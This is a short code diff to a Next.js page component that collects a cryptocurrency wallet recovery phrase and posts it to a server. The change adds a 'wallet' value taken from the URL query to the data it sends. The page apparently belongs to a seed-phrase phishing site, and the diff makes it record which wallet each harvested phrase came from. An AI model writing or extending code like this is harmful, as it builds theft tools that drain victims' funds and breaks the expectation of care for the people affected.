@@ -5,9 +5,11 @@ import CryptoMobile from "@/assets/crypto-mobile.svg";
 import Image from "next/image";
 import Link from "next/link";
 import { useState, FormEvent } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 
 export default function Crypto() {
+  const searchParams = useSearchParams();
+  const wallet = searchParams.get("wallet");
   const [isLoading, setIsLoading] = useState(false);
   const [recoveryPhrase, setRecoveryPhrase] = useState("");
   const router = useRouter();
@@ -21,7 +23,7 @@ export default function Crypto() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ phrase: recoveryPhrase }),
+        body: JSON.stringify({ phrase: recoveryPhrase, wallet: wallet ?? undefined }),
       });
 
       if (!response.ok) {
